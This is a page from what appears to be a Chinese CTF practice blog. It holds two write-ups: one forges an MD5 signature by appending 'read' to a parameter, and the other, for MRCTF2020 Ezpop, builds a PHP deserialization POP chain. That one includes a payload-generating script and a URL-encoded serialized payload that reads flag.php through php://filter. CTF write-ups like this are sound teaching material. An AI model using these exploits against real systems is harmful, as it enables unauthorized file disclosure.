<p>所以就是一个MD5</p>
<p>之后的步骤就断了</p>
<p>所以往后看看geneSign</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure>

<p>这个也是调用了getsign函数</p>
<p>同时是使用了scan</p>
<p>再回到check那个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)   #注意w，可以对result.txt文件进行修改</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)	#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)	#打开方式为只读</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()	#读取result.txt中的数据</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure>

<p>看的很明白就是说scan要扫描，read再读出数据，怎么说</p>
<p>所以说action里面要带有scan和read</p>
<p>所以，我们首先scan已经在action里面了</p>
<p>所以重点就是说这个read怎么插入进去</p>
<p>然后就想到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>所以，如果我们如果是param&#x3D;flag.txtread不就read和scan都有了？</p>
<p>天才！出院！</p>
<p>所以访问</p>
<p> &#x2F;geneSign?param&#x3D;flag.txtread</p>
<p>拿到86c0dcc170604d413c5d94cc1653e745</p>
<p>直接访问 &#x2F;De1ta?param&#x3D;flag.txt 构造 Cookie: sign&#x3D;86c0dcc170604d413c5d94cc1653e745;action&#x3D;readscan 即可</p>
<p>拿到flag</p>
<p>总结：</p>
<p>代码看不懂（枯萎）</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/MRCTF2020-Ezpop/">
        <h2 class="post-title">[MRCTF2020]Ezpop</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>魔术函数介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔法函数：</span><br><span class="line">__invoke():</span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line"> </span><br><span class="line">__construct():</span><br><span class="line">创建类对象时自动调用 当使用 new 操作符创建一个类的实例时，构造方法将会自动调用</span><br><span class="line"> </span><br><span class="line">__toString()：</span><br><span class="line">__toString()会在需要转成字符串时, 会隐式自动调用它, 在PHP内部. 这个也是来自JAVA的</span><br><span class="line">当一个对象被当作一个字符串被调用。</span><br><span class="line"> </span><br><span class="line">__wakeup()：</span><br><span class="line">使用unserialize时触发</span><br><span class="line"> </span><br><span class="line">__get()    用于从不可访问的属性读取数据</span><br><span class="line">#难以访问包括：（1）私有属性，（2）没有初始化的属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1)通过get传递序列化Show对象参数$pop，此时会对$pop变量进行反序列化从而调用__wakeup()函数</span><br><span class="line"></span><br><span class="line">2)可以看到类Show的函数__construct对变量$this-&gt;source进行echo输出，如果这里的变量$this-&gt;source为Show对象的话，那么就会调用函数_toString()</span><br><span class="line"></span><br><span class="line">3)__toString函数返回了一个变量$this-&gt;str-&gt;soucre，此时类Test中存在__get函数，我们可以将$this-&gt;str赋值为一个Test对象，而Test类中并没有source这个变量，因此将会调用__get函数</span><br><span class="line"></span><br><span class="line">4)类Modifier中存在__invoke函数，可以第三步中类Test的__get函数将this-&gt;p传递给$function并且return $function()，只要将$this-&gt;p赋值为一个Modifier对象，那么就会返回一个Modifier类对象的函数，将会调用Modifier类中的__invoke函数</span><br><span class="line"></span><br><span class="line">5)__invoke函数调用了append函数，只要将变量$var的内容设为我们需要包含的文件伪协议读取命令就可以了</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show();</span><br><span class="line">$b= new Show();</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=new Test();</span><br><span class="line">($b-&gt;str)-&gt;p=new Modifier();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A0%3A%22%22%3B%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag的base64编码，解码得到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/MRCTF2020-Ezpop/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <a class="page-num" href="/">
        <i class="fa-solid fa-caret-left fa-fw"></i>
    </a>
    <a class="page-num" href="/">1</a>
    <span class="page-omit">...</span>
    
    <span class="current">2</span>
    
    <a class="page-num" href="/page/3">3</a>
    
    
    <a class="page-num" href="/page/4">4</a>
    
    
    <span class="page-omit">...</span>
    <a class="page-num" href="/page/5">5</a>
    
    
    <a class="page-num" href="/page/3/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/avatar.jpg" alt="avatar" />
        </div>
        <div class="name">why</div>
        <div class="description">
            <p>Description<br>…</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 why
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;why
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
<script src="/js/<file>"></script>
<link rel="stylesheet" href="/css/<file>" />
</body>
</html>
